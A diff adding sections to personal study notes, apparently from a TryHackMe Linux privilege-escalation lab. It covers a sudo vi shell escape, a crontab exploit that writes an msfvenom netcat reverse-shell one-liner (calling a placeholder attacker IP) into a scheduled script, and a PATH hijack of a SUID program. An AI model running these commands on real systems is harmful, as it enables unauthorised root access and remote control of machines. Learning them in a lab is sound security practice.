@@ -81,3 +81,55 @@ Exploiting:
 ----$ su new
 ----Password: new
  
+ESCAPING_VI_EDITOR:
+Using the sudo -l command shows you a list of what you can run with your current privileges.
+GTFOBins is a list of UNIX binaries that can be exploited by an attacker to bypass local security.
+https://gtfobins.github.io/
+If you can run sudo vi you can do this:
+$ sudo vi
+:!sh
+This will open a shell. 
+
+EXPLOITING_CRONTAB:
+As listed before the cron is a daemon process that executes commands at specific times and dates. 
+You can create your own cronjobs to get cron daemon to execute.
+cat /etc/crontab show which cron jobs are scheduled. 
+Format of cronjobs - TryHackMe: 
+# = ID
+m = Minute
+h = Hour
+dom = Day of the month
+mon = Month
+dow = Day of the week
+user = What user the command will run as
+command = What command should be run
+I.E. 17 *   1  *   *   *  root  cd / && run-parts --report /etc/cron.hourly
+Practical example of exploiting crontabs:
+Create a payload using msfvenom:
+$ msfvenom -p cmd/unix/reverse_netcat lhost=ip lport=8888 R
+[-] No platform was selected, choosing Msf::Module::Platform::Unix from the payload
+[-] No arch selected, selecting arch: cmd from the payload
+No encoder specified, outputting raw payload
+Payload size: 92 bytes
+mkfifo /tmp/pfcvc; nc ip 8888 0</tmp/pfcvc | /bin/sh >/tmp/pfcvc 2>&1; rm /tmp/pfcvc
+
+Now you can do replace you payload with the autoscript or whatever crontab you want: 
+user4@polobox:~/Desktop$ echo mkfifo /tmp/pfcvc; nc myip 8888 0</tmp/pfcvc | /bin/sh >/tmp/pfcvc 2>&1; rm /tmp/pfcvc > autoscript.sh
+mkfifo /tmp/pfcvc
+user4@polobox:~/Desktop$
+$ nc -nlvp 8888
+
+EXPLOITING_PATH_VARIABLE:
+You can exploit path with SUID files by re-writing the path for these files and sticking one in place of it. 
+Practical example:
+We go to user5's home directory and run script:
+user5@polobox:~$ ./script
+Desktop  Documents  Downloads  Music  Pictures  Public  script  Templates  Videos
+This tells us the command is being ran is ls
+we can mock this by going to tmp and writing the following
+echo "/bin/bash" > ls
+This is in the format: echo "[whatever command we want to run]" > [name of the executable we're imitating] 
+Next we can make this command an executable by doing: 
+chmod +x ls
+I couldn't get this to work for me so I'm not going to note on it but follow this for similar exploitation: https://tryhackme.com/r/room/commonlinuxprivesc task 9
+
